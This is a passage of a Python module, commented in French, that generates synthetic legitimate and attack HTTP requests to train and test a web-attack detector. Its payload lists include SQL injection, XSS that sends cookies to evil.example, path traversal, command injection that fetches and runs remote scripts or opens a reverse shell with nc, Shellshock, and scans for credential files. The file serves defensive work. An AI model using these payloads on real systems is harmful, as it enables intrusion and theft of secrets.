"""
Trafic synthétique (DVWA, WordPress et sites génériques) pour compléter le dataset d'entraînement.

Pourquoi : le dataset ne contient que du trafic légitime WordPress et des attaques d'outils
(scanners) : le modèle y apprend les empreintes d'en-têtes au lieu du contenu des requêtes, et
bloque tout formulaire ou toute API JSON légitime d'un autre site. Ici, légitime et attaque partagent les MÊMES
profils de navigateurs : seul le contenu (URL, paramètres, corps, cookie) distingue les classes.

generer(n_legit, n_attaque, seed, ensemble) -> DataFrame(text, label, famille)
  ensemble="train" : payloads du jeu A, pages légitimes courantes
  ensemble="test"  : payloads du jeu B (jamais vus) + pages légitimes absentes de l'entraînement
Le texte produit est au format du modèle (preprocessing.build_text).
"""
import json
import random
import re
from urllib.parse import quote, urlencode

import pandas as pd

from preprocessing import SITE_HOST, build_text, champs_from_http

# --------------------------------------------------------------------------- profils d'en-têtes
ACCEPT_HTML = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
ACCEPT_FF = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
ACCEPT_IMG = "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8"
LANGUES = ["fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7", "en-US,en;q=0.9", "en-GB,en;q=0.9",
           "fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3", "de-DE,de;q=0.9,en;q=0.8", "es-ES,es;q=0.9,en;q=0.8",
           "en-US,en;q=0.5"]
NAVIGATEURS = [
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.0.0 Safari/537.36", ACCEPT_HTML, "gzip, deflate, br, zstd", (100, 131)),
    ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.0.0 Safari/537.36", ACCEPT_HTML, "gzip, deflate, br", (100, 131)),
    ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.0.0 Safari/537.36", ACCEPT_HTML, "gzip, deflate, br", (100, 131)),
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.0.0 Safari/537.36 Edg/{v}.0.0.0", ACCEPT_HTML, "gzip, deflate, br", (100, 131)),
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{v}.0) Gecko/20100101 Firefox/{v}.0", ACCEPT_FF, "gzip, deflate, br", (100, 133)),
    ("Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:{v}.0) Gecko/20100101 Firefox/{v}.0", ACCEPT_FF, "gzip, deflate, br", (100, 133)),
    ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:{v}.0) Gecko/20100101 Firefox/{v}.0", ACCEPT_FF, "gzip, deflate, br", (100, 133)),
    ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{v}.1 Safari/605.1.15", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "gzip, deflate, br", (15, 18)),
    ("Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.0.0 Mobile Safari/537.36", ACCEPT_HTML, "gzip, deflate, br", (100, 131)),
    ("Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{v}.1 Mobile/15E148 Safari/604.1", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "gzip, deflate, br", (15, 18)),
]
OUTILS = ["curl/8.4.0", "curl/7.88.1", "python-requests/2.31.0", "sqlmap/1.7.11#stable (https://sqlmap.org)",
          "Nikto/2.1.6", "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
          "Wget/1.21.4", "Go-http-client/1.1", "python-urllib3/2.0.7", ""]
VULNS = ["brute", "exec", "csrf", "fi", "upload", "captcha", "sqli", "sqli_blind", "weak_id", "xss_d", "xss_r", "xss_s", "csp", "javascript"]
VULNS_TEST_SEULEMENT = {"captcha", "csp", "javascript", "weak_id", "upload"}

# --------------------------------------------------------------------------- valeurs légitimes
PRENOMS = ["John", "Marie", "Pierre", "Sophie", "Ahmed", "Li", "Anna", "Tom", "Julien", "Camille", "Élodie",
           "François", "Zoë", "bob", "alice", "Nolhan", "Malki", "O'Brien", "d'Artagnan", "Jean-Pierre", "Mary Ann"]
MESSAGES = ["Great site!", "Merci pour cet article, c'est très utile.", "It's working fine :)", "Hello everyone",
            "Test message", "I can't log in sometimes", "Super boulot, l'équipe !", "See you at 5pm - bye",
            "Price: 10$ (approx.)", "How do I reset my password?", "Visit https://example.com for more info",
            "Meeting @ 10:30; bring notes", "Rock & Roll forever", "a=b means equality", "C'est l'été à Paris",
            "Love it <3", "What's the best way to learn Python?", "Thanks a lot!!!", "Bonjour, ça va ?",
            "Please select the first option, then click \"Submit\"", "Email me at test@example.com", "100% satisfied",
            "Question: why does it say 'undefined'?", "Update: fixed in version 2.0 (see changelog)",
            "Où est-ce que je peux télécharger le fichier ?", "good", "ok", "nice work, keep going", "x = 5 + 3",
            "The quick brown fox jumps over the lazy dog", "Salut, je m'appelle Marc et j'aime les chats"]
MESSAGES_NATUREL = ["Please select an option from the list", "The European Union voted today", "Drop me an email when you can",
                    "I need to update my profile and delete the old picture", "Where can I find the script of the movie?",
                    "How to insert a table into a document?", "Union Jack flag, 3 for 2 offer", "Select all and copy, then paste",
                    "He said: 'drop it' and left", "Order by date or by name?", "Please alert me when it's ready",
                    "Cat or dog? I prefer my cat", "Let's meet at the root of the tree, in the etc. section", "admin, please check my request"]
MESSAGES_TEST = ["Nice tutorial, thank you so much", "J'ai un problème avec mon compte, pouvez-vous m'aider ?",
                 "Select the best answer: a) 4 b) 5", "Union of two sets: A ∪ B", "How do I drop a column in Excel?",
                 "It's 5 o'clock somewhere!", "Check out my script for the school project", "Version 1.2.3 released (see notes)",
                 "Voici l'adresse : 12 rue de l'Église, Lyon", "Where is the cat? & where is the dog?", "50% off - today only; hurry up",
                 "Please delete my old comment, it's outdated"]
MOTS_RECHERCHE = ["recette de crêpes", "l'été à paris", "python tutorial", "météo lyon", "how to cook rice",
                  "dvwa setup", "password reset", "contact", "prix 2024", "mentions légales", "café & thé"]
COMPTES = [("admin", "password"), ("gordonb", "abc123"), ("1337", "charley"), ("pablo", "letmein"),
           ("smithy", "password"), ("admin", "admin"), ("user", "123456"), ("test", "test"), ("admin", "Passw0rd!"),
           ("marie", "m0t2passe"), ("pierre.dupont", "azerty123")]
PAGES = ["/", "/index.php", "/login.php", "/setup.php", "/instructions.php", "/about.php", "/security.php",
         "/logout.php", "/phpinfo.php", "/vulnerabilities/", "/robots.txt", "/ids_log.php"]
STATIQUES = [("/dvwa/css/main.css", "text/css,*/*;q=0.1"), ("/dvwa/css/login.css", "text/css,*/*;q=0.1"),
             ("/dvwa/js/dvwaPage.js", "*/*"), ("/dvwa/images/logo.png", ACCEPT_IMG),
             ("/dvwa/images/login_logo.png", ACCEPT_IMG), ("/dvwa/images/RandomStorm.png", ACCEPT_IMG),
             ("/favicon.ico", ACCEPT_IMG)]
STATIQUES_TEST_SEULEMENT = [("/dvwa/css/help.css", "text/css,*/*;q=0.1"), ("/dvwa/js/add_event_listeners.js", "*/*"),
                            ("/dvwa/images/spanner.png", ACCEPT_IMG), ("/dvwa/images/lock.png", ACCEPT_IMG)]

# --------------------------------------------------------------------------- payloads d'attaque
# Jeu A (entraînement) / jeu B (test, jamais vu à l'entraînement)
SQLI_A = ["1' OR '1'='1", "1' OR 1=1-- -", "' OR '1'='1' -- ", "1 OR 1=1", "admin'--", "1' UNION SELECT NULL,NULL-- -",
          "1' UNION SELECT user,password FROM users-- -", "1' AND 1=1-- -", "1' AND SLEEP(5)-- -", "1;DROP TABLE users--",
          "1' ORDER BY 3-- -", "' OR ''='", "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0-- -",
          "1'/**/OR/**/1=1-- -", "1' OR 'a'='a", "') OR ('1'='1", "1 UNION SELECT 1,2,3", "admin' #"]
SQLI_B = ["2' OR 'x'='x", "1' || '1'='1", "-1' UNION ALL SELECT 1,@@version-- -",
          "1' AND 1=2 UNION SELECT table_name,2 FROM information_schema.tables-- -", "1') OR ('1'='1",
          "1' AND BENCHMARK(1000000,MD5(1))-- -", "x' OR 1=1 LIMIT 1-- -", "1'; WAITFOR DELAY '0:0:5'-- -",
          "1' UnIoN SeLeCt 1,2-- -", "1' and extractvalue(1,concat(0x7e,version()))-- -", "0 or 1=1", "' OR 1=1#",
          "1%27%20OR%20%271%27%3D%271", "99999' OR 1=1 --", "1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64-- -"]
XSS_A = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>",
         "\"><script>alert(document.cookie)</script>", "<iframe src=javascript:alert(1)>", "<body onload=alert('XSS')>",
         "javascript:alert(1)", "<a href=\"javascript:alert(1)\">x</a>", "<input autofocus onfocus=alert(1)>",
         "<script>document.location='http://evil.example/?c='+document.cookie</script>", "<img src=1 onerror=alert(document.domain)>"]
XSS_B = ["<ScRiPt>alert(2)</sCrIpT>", "<svg/onload=confirm(1)>", "<img src=\"x\" onerror=\"prompt(1)\">", "'-alert(1)-'",
         "<details open ontoggle=alert(1)>", "<video><source onerror=alert(1)>", "<script src=//evil.example/x.js></script>",
         "<marquee onstart=alert(1)>", "%3Cscript%3Ealert(1)%3C/script%3E", "<body onpageshow=alert(1)>",
         "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>", "<script>fetch('http://evil.example/'+document.cookie)</script>"]
LFI_A = ["../../../../etc/passwd", "../../../../../../etc/shadow", "....//....//....//etc/passwd", "/etc/passwd",
         "../../../windows/win.ini", "php://filter/convert.base64-encode/resource=index.php",
         "http://evil.example/shell.txt", "../../../../proc/self/environ", "..%2f..%2f..%2fetc%2fpasswd",
         "../../../../etc/passwd%00", "../../config/config.inc.php"]
LFI_B = ["..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "/var/www/html/config.inc.php", "file:///etc/passwd",
         "....\\....\\boot.ini", "expect://id", "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
         "//evil.example/x.php", "../../../../var/log/apache2/access.log", "/proc/self/cmdline", "../../../../etc/hosts",
         "..././..././..././etc/passwd", "https://evil.example/rfi.txt?"]
CMD_A = ["127.0.0.1; cat /etc/passwd", "127.0.0.1 && whoami", "127.0.0.1 | ls -la", "; id", "`id`", "$(whoami)",
         "127.0.0.1; uname -a", "|| cat /etc/passwd", "127.0.0.1; wget http://evil.example/x.sh -O- | sh", "& dir",
         "127.0.0.1 ; ls /", "1.1.1.1 && cat /etc/hosts"]
CMD_B = ["8.8.8.8;ls", "127.0.0.1\ncat /etc/passwd", "x | nc -e /bin/sh 10.0.0.1 4444", "$(cat /etc/passwd)",
         "127.0.0.1 && curl http://evil.example/s | bash", "; ping -c 10 127.0.0.1", "|id", "1;sleep 5",
         "127.0.0.1;rm -rf /tmp/x", "`uname -a`", "127.0.0.1 || id", "localhost; /bin/bash -i"]
SCAN_A = ["/.env", "/.git/config", "/phpmyadmin/", "/wp-config.php.bak", "/backup.sql", "/server-status", "/admin/",
          "/.htaccess", "/config.php~", "/.svn/entries", "/xmlrpc.php", "/wp-login.php", "/cgi-bin/test.cgi", "/.DS_Store",
          "/../../../../etc/passwd", "/wp-admin/install.php", "/.git/HEAD", "/.bash_history", "/.ssh/authorized_keys",
          "/.npmrc", "/.dockerenv", "/.gitignore", "/.hg/", "/.idea/workspace.xml", "/.vscode/settings.json",
          "/config.php.bak", "/db.sql", "/dump.sql", "/site.tar.gz", "/www.zip", "/old/", "/test.php", "/info.php",
          "/shell.php", "/c99.php", "/upload/shell.php", "/wp-content/debug.log", "/error_log", "/administrator/",
          "/login.action", "/jmx-console/", "/axis2/", "/phpMyAdmin/", "/pma/", "/mysql/", "/sqladmin/", "/dbadmin/",
          "/server-info", "/swagger-ui.html", "/api/v1/pods", "/v2/_catalog", "/cgi-bin/php", "/cgi-bin/bash",
          "/boaform/admin/formLogin", "/HNAP1/", "/owa/auth/logon.aspx", "/remote/login", "/etc/shadow", "/proc/self/environ"]
SCAN_B = ["/.aws/credentials", "/id_rsa", "/database.sql.gz", "/adminer.php", "/web.config", "/WEB-INF/web.xml",
          "/actuator/env", "/solr/admin/", "/manager/html", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
          "/console", "/etc/passwd", "/..%2f..%2f..%2fwindows%2fwin.ini", "/.ssh/id_rsa", "/composer.json.bak",
          "/%2e%2e/%2e%2e/%2e%2e/etc/passwd", "/.env.production", "/backup.zip", "/.bashrc", "/.mysql_history", "/.git/index",
          "/wp-config.php~", "/app/config/parameters.yml", "/config/database.yml", "/appsettings.json", "/.DS_Store.bak",
          "/phpmyadmin4/index.php", "/mysqladmin/", "/webshell.php", "/cmd.jsp", "/uploads/x.php", "/tmp/shell.php",
          "/_profiler/", "/telescope/requests", "/debug/pprof/", "/graphql?query={__schema{types{name}}}", "/api/swagger.json",
          "/cgi-bin/.%2e/.%2e/.%2e/etc/passwd", "/hudson/script", "/script", "/nacos/v1/auth/users", "/.kube/config"]
VOCAB_A = ["red", "blue", "shoes", "jacket", "laptop", "phone", "camera", "book", "garden", "kitchen", "travel", "music", "sport",
           "health", "news", "tech", "food", "fashion", "home", "office", "kids", "toys", "games", "movies", "art", "science",
           "history", "cooking", "fitness", "photo", "design", "review", "guide", "tips", "deals", "sale", "new", "best", "top",
           "summer", "winter", "paris", "lyon", "france", "europe", "chaussures", "veste", "ordinateur", "recette", "voyage",
           "cuisine", "maison", "jardin", "actualites", "mode", "sante", "livre", "musique", "velo", "cafe", "pain", "fromage"]
VOCAB_B = ["green", "black", "boots", "coat", "tablet", "watch", "speaker", "novel", "patio", "bathroom", "hiking", "jazz", "tennis",
           "wellness", "politics", "gadgets", "recipes", "garage", "studio", "babies", "puzzles", "consoles", "series", "painting",
           "physics", "medieval", "baking", "yoga", "portrait", "branding", "comparison", "tutorial", "hacks", "coupons", "clearance",
           "fresh", "popular", "spring", "autumn", "berlin", "madrid", "italy", "asia", "pantalon", "manteau", "telephone", "dessert",
           "vacances", "salon", "terrasse", "culture", "beaute", "bd", "cinema", "randonnee", "chocolat", "miel", "vin", "pommes"]
CHEMINS_A = ["/products", "/products/{s}", "/product/{n}", "/category/{s}/", "/category/{s}/page/{n}/", "/blog/{y}/{m}/{s}/",
             "/news/{s}", "/user/{s}", "/users/{n}/profile", "/api/{s}", "/api/v1/{s}/{n}", "/search", "/cart", "/checkout",
             "/contact", "/about-us", "/faq", "/register", "/account/settings", "/static/{s}.js", "/assets/css/{s}.css",
             "/images/{s}.jpg", "/wp-content/uploads/{y}/{m}/{s}.jpg", "/feed/", "/sitemap.xml", "/home", "/dashboard",
             "/tag/{s}/", "/shop/{s}/{s}", "/articles/{n}"]
CHEMINS_B = ["/catalog/{s}", "/item/{n}/details", "/forum/{s}/thread/{n}", "/docs/{s}/", "/download/{s}.pdf", "/v2/{s}/{n}",
             "/events/{y}/{m}", "/profile/{s}", "/gallery/{s}/", "/wiki/{s}"]
FORMULAIRES = ["/contact", "/newsletter", "/register", "/login", "/cart/add", "/comment", "/search", "/subscribe", "/feedback",
               "/wp-comments-post.php", "/wp-comments-post.php", "/wp-login.php"]
FORMULAIRES += ["/wp-admin/admin-ajax.php", "/wp-admin/install.php?step=2", "/wp-login.php", "/wp-login.php", "/wp-login.php", "/wp-comments-post.php", "/wp-comments-post.php"]
FORMULAIRES_B = []
SHELLSHOCK = "() { :;}; echo; /bin/cat /etc/passwd"


def _casse(r, p):
    return "".join(c.upper() if r.random() < 0.5 else c.lower() for c in p)


def muter(r, p, kind):
    """Obfuscation aléatoire d'un payload (40 % des cas) : casse, espaces, double encodage, etc."""
    if r.random() > 0.4:
        return p
    if kind == "sql":
        c = r.choice(["casse", "commentaire", "plus", "double", "tab", "casse+commentaire"])
        if c == "casse":
            return _casse(r, p)
        if c == "commentaire":
            return p.replace(" ", "/**/")
        if c == "plus":
            return p.replace(" ", "+")
        if c == "double":
            return quote(p, safe="")
        if c == "tab":
            return p.replace(" ", "	")
        return _casse(r, p).replace(" ", "/**/")
    if kind == "xss":
        c = r.choice(["casse", "double", "slash", "null"])
        return {"casse": lambda: _casse(r, p), "double": lambda: quote(p, safe=""),
                "slash": lambda: p.replace(" ", "/"), "null": lambda: p.replace("<", "<%00")}[c]()
    if kind == "lfi":
        c = r.choice(["enc", "double", "dots", "null", "back"])
        return {"enc": lambda: p.replace("../", "..%2f"), "double": lambda: p.replace("../", "..%252f"),
                "dots": lambda: p.replace("../", "....//"), "null": lambda: p + "%00",
                "back": lambda: p.replace("../", "..\\")}[c]()
    c = r.choice(["ifs", "plus", "sep", "tick"])  # cmd
    return {"ifs": lambda: p.replace(" ", "${IFS}"), "plus": lambda: p.replace(" ", "+"),
            "sep": lambda: p.replace(";", "%0a").replace("&&", "%0a"), "tick": lambda: "`" + p + "`"}[c]()


class _Gen:
    def __init__(self, seed, ensemble):
        self.r = random.Random(seed)
        self.test = ensemble == "test"
        s = (lambda a, b: b) if self.test else (lambda a, b: a)
        self.sqli, self.xss, self.lfi = s(SQLI_A, SQLI_B), s(XSS_A, XSS_B), s(LFI_A, LFI_B)
        self.cmd, self.scan = s(CMD_A, CMD_B), s(SCAN_A, SCAN_B)
        self.messages = MESSAGES_TEST if self.test else MESSAGES + MESSAGES_NATUREL
        self.force_outil = False
        self.vocab = VOCAB_B if self.test else VOCAB_A
        self.chemins = CHEMINS_A + CHEMINS_B if self.test else CHEMINS_A

    # -------------------------------------------------------------- trafic générique (autres sites)
    def slug(self):
        return "-".join(self.r.choices(self.vocab, k=self.r.randint(1, 3)))

    def chemin(self):
        r = self.r
        t = r.choice(self.chemins)
        t = re.sub(r"\{s\}", lambda m: self.slug(), t)
        return (t.replace("{n}", str(r.randint(1, 5000))).replace("{y}", str(r.randint(2015, 2025)))
                .replace("{m}", "%02d" % r.randint(1, 12)))

    def prefixe(self, anciens):
        return self.chemin() + "?" if self.r.random() < 0.5 else self.r.choice(anciens)

    def params(self):
        r = self.r
        pool = {"page": lambda: r.randint(1, 40), "limit": lambda: r.choice([10, 20, 50, 100]), "offset": lambda: r.randint(0, 500),
                "sort": lambda: r.choice(["name", "price", "date", "rating"]), "order": lambda: r.choice(["asc", "desc"]),
                "q": lambda: r.choice(MOTS_RECHERCHE + [self.slug().replace("-", " ")]), "category": self.slug,
                "id": lambda: r.randint(1, 9999), "lang": lambda: r.choice(["fr", "en", "de", "es"]),
                "utm_source": lambda: r.choice(["newsletter", "twitter", "google", "facebook"]), "ref": self.slug,
                "color": lambda: r.choice(["red", "blue", "black", "green"]), "size": lambda: r.choice(["S", "M", "L", "XL"])}
        cles = r.sample(sorted(pool), r.randint(0, 4))
        return {k: pool[k]() for k in cles}

    def formulaire(self):
        r = self.r
        nom = r.choice(PRENOMS)
        mail = "%s%d@example.com" % (re.sub(r"[^a-z]", "", nom.lower()) or "user", r.randint(1, 99))
        pw = r.choice(["P@ssw0rd!2024", "m0t2passe", "Tr0ub4dor&3", "azerty123", "Summer#2024", "correct horse battery",
                       "".join(r.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*-_", k=r.randint(8, 16)))])
        if r.random() < 0.3:   # comptes courants (admin, editor...) : un login ne se juge pas sur le nom d'utilisateur
            nom = r.choice(["admin", "administrator", "editor", "test", "user", "webmaster", "jean.dupont", "m.martin"])
        chemin =r.choice(FORMULAIRES + (FORMULAIRES_B if self.test else []))
        champs = {"/contact": {"name": nom, "email": mail, "message": r.choice(self.messages)},
                  "/newsletter": {"email": mail, "consent": "1"},
                  "/register": {"username": nom.lower(), "email": mail, "password": pw},
                  "/login": {"email": mail, "password": pw, "remember": "on"},
                  "/cart/add": {"product_id": r.randint(1, 5000), "qty": r.randint(1, 5)},
                  "/comment": {"author": nom, "email": mail, "comment": r.choice(self.messages)},
                  "/search": {"q": r.choice(MOTS_RECHERCHE)},
                  "/subscribe": {"email": mail}, "/feedback": {"rating": r.randint(1, 5), "comment": r.choice(self.messages)},
                  "/wp-comments-post.php": {"comment": r.choice(self.messages), "author": nom, "email": mail, "url": r.choice(["", "http://www.example.com"]),
                                            "submit": "Post Comment", "comment_post_id": r.randint(1, 300), "comment_parent": 0},
                  "/wp-admin/admin-ajax.php": {"action": r.choice(["heartbeat", "query-attachments", "load_more", "get_cart"]),
                                               "_wpnonce": "".join(r.choices("0123456789abcdef", k=10))},
                  "/wp-admin/install.php?step=2": {"weblog_title": r.choice(["Mon blog", "Test", "Site de %s" % nom]), "user_name": nom.lower(),
                                                   "admin_password": pw, "admin_password2": pw, "pw_weak": 1, "admin_email": mail,
                                                   "Submit": "Install WordPress", "language": ""},
                  "/wp-login.php": {"log": nom.lower(), "pwd": pw, "wp-submit": "Log In", "redirect_to": "http://%s/wp-admin/" % SITE_HOST,
                                    "testcookie": 1}}[chemin]
        if r.random() < 0.35:   # formulaire incomplet (champs optionnels absents)
            ks = list(champs)
            garde = sorted(r.sample(range(len(ks)), r.randint(min(2, len(ks)), len(ks))))
            champs = {ks[i]: champs[ks[i]] for i in garde}
        return chemin, champs

    # -------------------------------------------------------------- cookies (communs aux deux classes)
    def cookie(self, profil=None, outil=False):
        r = self.r

        def hx(n):
            return "".join(r.choices("0123456789abcdef", k=n))
        if outil and r.random() < 0.7:
            return ""
        if profil is None:
            profil = r.choices(["none", "dvwa", "wp", "juice", "generic"], [15, 15, 22, 18, 30])[0]
        elif r.random() < 0.1:
            profil = "none"
        if profil == "dvwa":
            return "PHPSESSID=%s; security=%s" % ("".join(r.choices("0123456789abcdefghijklmnopqrstuvwxyz", k=26)),
                                                  r.choice(["low", "low", "medium", "high", "impossible"]))
        if profil == "wp":
            c = ["wordpress_test_cookie=WP%20Cookie%20check"]
            if r.random() < 0.5:
                c += ["wordpress_logged_in_%s=%s%%7C%d%%7C%s%%7C%s" % (hx(32), r.choice(PRENOMS).lower(), r.randint(1700000000, 1800000000), hx(40), hx(64)),
                      "wp-settings-1=libraryContent%3Dbrowse", "wp-settings-time-1=%d" % r.randint(1700000000, 1800000000)]
            elif r.random() < 0.3:
                c.append("comment_author_%s=%s" % (hx(32), r.choice(PRENOMS)))
            return "; ".join(c)
        if profil == "juice":
            c = ["language=en", "welcomebanner_status=dismiss", "cookieconsent_status=dismiss"]
            if r.random() < 0.5:
                c.append("token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.%s.%s" % (hx(60), hx(40)))
            return "; ".join(c)
        if profil == "generic":
            return r.choice(["session=%s" % hx(32), "sessionid=%s; csrftoken=%s" % (hx(32), hx(40)),
                             "_ga=GA1.2.%d.%d; _gid=GA1.2.%d.%d" % (r.randint(10**8, 2 * 10**9), r.randint(1600000000, 1800000000),
                                                                    r.randint(10**8, 2 * 10**9), r.randint(1600000000, 1800000000)),
                             "JSESSIONID=%s" % hx(32).upper(), "connect.sid=s%%3A%s" % hx(48),
                             "cart=%d; lang=%s" % (r.randint(1, 9), r.choice(["fr", "en"]))])
        return ""

    # -------------------------------------------------------------- API JSON (mêmes formes pour les deux classes)
    def json_corps(self):
        r = self.r
        nom = r.choice(PRENOMS)
        mail = "%s%d@example.com" % (re.sub(r"[^a-z]", "", nom.lower()) or "user", r.randint(1, 99))
        pw = r.choice(["P@ssw0rd!2024", "m0t2passe", "Tr0ub4dor&3", "azerty123", "Summer#2024", "ncc-1701"])
        n = r.randint(1, 5000)
        formes = [
            lambda: (r.choice(["/api/auth/login", "/api/login", "/auth/signin", "/api/v1/session", "/login", "/api/users/login"]),
                     dict({"email": mail, "password": pw}, **({"remember": r.choice([True, False])} if r.random() < 0.4 else {}))),
            lambda: (r.choice(["/api/register", "/api/users", "/signup"]), {"name": nom, "email": mail, "password": pw}),
            lambda: (r.choice(["/api/search", "/api/v1/products/search"]),
                     {"query": r.choice(MOTS_RECHERCHE), "page": r.randint(1, 30), "limit": 20, "filters": {"category": self.slug()}}),
            lambda: (r.choice(["/api/cart/items", "/api/cart"]), {"product_id": n, "quantity": r.randint(1, 5)}),
            lambda: (r.choice(["/api/comments", "/api/posts/%d/comments" % n]),
                     {"author": nom, "message": r.choice(self.messages), "rating": r.randint(1, 5)}),
            lambda: (r.choice(["/api/profile", "/api/users/%d" % n]),
                     {"first_name": nom, "last_name": r.choice(PRENOMS), "phone": "06 %02d %02d %02d %02d" % tuple(r.randint(0, 99) for _ in range(4)),
                      "address": {"city": r.choice(["Paris", "Lyon", "Lille"]), "zip": "%05d" % r.randint(1000, 99999)}}),
            lambda: ("/graphql", r.choice([{"query": "{ products(first: %d) { id name price } }" % r.randint(5, 50), "variables": {}},
                                           {"operationName": "GetUser", "query": "query GetUser($id: ID!) { user(id: $id) { id name email } }",
                                            "variables": {"id": str(n)}}])),
        ]
        if self.test:   # formes de type Juice Shop : jamais vues à l'entraînement
            formes += [
                lambda: ("/rest/user/login", {"email": mail, "password": pw}),
                lambda: ("/api/Users/", {"email": mail, "password": pw, "passwordRepeat": pw,
                                         "securityQuestion": {"id": r.randint(1, 9), "answer": r.choice(PRENOMS)}}),
                lambda: ("/api/BasketItems/", {"ProductId": r.randint(1, 40), "BasketId": str(r.randint(1, 9)), "quantity": r.randint(1, 3)}),
                lambda: ("/api/Feedbacks/", {"UserId": r.randint(1, 20), "captchaId": r.randint(0, 99), "captcha": str(r.randint(-9, 99)),
                                             "comment": r.choice(self.messages), "rating": r.randint(1, 5)}),
                lambda: ("/rest/products/%d/reviews" % r.randint(1, 40), {"message": r.choice(self.messages), "author": mail}),
            ]
        return r.choice(formes)()

    def json_attaque(self, payload):
        """Même forme qu'un JSON légitime, avec un champ texte remplacé par le payload."""
        chemin, corps = self.json_corps()
        feuilles = []

        def collecte(o):
            for k, v in o.items():
                if isinstance(v, dict):
                    collecte(v)
                elif isinstance(v, str) and k != "variables":
                    feuilles.append((o, k))
        collecte(corps)
        if not feuilles:   # pas de champ texte (ex. panier) : l'attaquant remplace une valeur numérique
            feuilles = [(corps, k) for k, v in corps.items() if not isinstance(v, dict)]
        o, k = self.r.choice(feuilles)
        o[k] = payload
        return chemin, corps

    # -------------------------------------------------------------- en-têtes
    def entetes(self, accept=None, outil=False, post=False, cookie=True, ct=None, profil=None):
        r = self.r
        if outil:
            h = {"user-agent": r.choice(OUTILS), "accept": "*/*", "accept-language": "", "accept-encoding": r.choice(["gzip, deflate", ""])}
        else:
            ua, acc, enc, (lo, hi) = r.choice(NAVIGATEURS)
            h = {"user-agent": ua.replace("{v}", str(r.randint(lo, hi))), "accept": accept or acc,
                 "accept-language": r.choice(LANGUES), "accept-encoding": enc}
        h["host"] = SITE_HOST
        h["connection"] = ""   # nginx supprime l'en-tête Connection avant le WAF
        h["cookie"] = self.cookie(profil, outil) if cookie else ""
        if post:
            h["content-type"] = ct or "application/x-www-form-urlencoded"
        return h

    def referer(self, outil=False):
        if outil or self.r.random() > 0.7:
            return ""
        page = self.r.choice(PAGES + ["/vulnerabilities/" + self.r.choice(VULNS) + "/" for _ in range(3)])
        return f"http://{SITE_HOST}{page}"

    def requete(self, method, target, body="", accept=None, outil=False, cookie=None, ua_injecte=None, referer=None, ct=None, profil=None):
        outil = outil or self.force_outil
        if target.split("?")[0].startswith(("/vulnerabilities", "/login.php", "/setup.php", "/security.php")):
            profil = "dvwa"
        h = self.entetes(accept, outil, post=(method == "POST"), ct=ct, profil=profil)
        if cookie is not None:
            h["cookie"] = cookie
        if ua_injecte:
            h["user-agent"] = ua_injecte
        h["referer"] = self.referer(outil) if referer is None else referer
        return build_text(champs_from_http(method, target, "HTTP/1.1", h, body))

    # -------------------------------------------------------------- trafic légitime
    def legit(self):
        r = self.r
        self.force_outil = r.random() < 0.12   # clients scriptés légitimes (curl, supervision, API)
        vulns = [v for v in VULNS if self.test or v not in VULNS_TEST_SEULEMENT]
        statiques = STATIQUES + (STATIQUES_TEST_SEULEMENT if self.test else [])
        genre = r.choices(["page", "static", "sqli", "xss_r", "fi", "brute", "exec", "csrf", "xss_s", "login", "security",
                           "setup", "search", "vuln_page", "gen_get", "gen_post", "json_legit"], weights=[8, 10, 4, 3, 2, 2, 3, 1, 3, 8, 1, 1, 4, 7, 50, 40, 30])[0]
        tok = lambda: "".join(r.choices("0123456789abcdef", k=32))  # noqa: E731
        if genre == "gen_get":
            q = self.params()
            return "gen_get", self.requete("GET", self.chemin() + ("?" + urlencode(q) if q else ""))
        if genre == "json_legit":
            chemin, corps = self.json_corps()
            return "json_legit", self.requete("POST", chemin, json.dumps(corps), accept="application/json, text/plain, */*",
                                              ct=r.choice(["application/json", "application/json", "application/json;charset=UTF-8"]))
        if genre == "gen_post":
            chemin, champs = self.formulaire()
            if r.random() < 0.15:
                return "gen_post", self.requete("POST", "/api" + chemin, json.dumps(champs), ct="application/json")
            return "gen_post", self.requete("POST", chemin, urlencode(champs))
        if genre == "page":
            return "page", self.requete("GET", r.choice(PAGES))
        if genre == "static":
            chemin, acc = r.choice(statiques)
            return "static", self.requete("GET", chemin, accept=acc)
        if genre == "vuln_page":
            return "vuln_page", self.requete("GET", f"/vulnerabilities/{r.choice(vulns)}/")
        if genre == "sqli":
            id_ = str(r.choice([1, 2, 3, 4, 5, r.randint(1, 30)]))
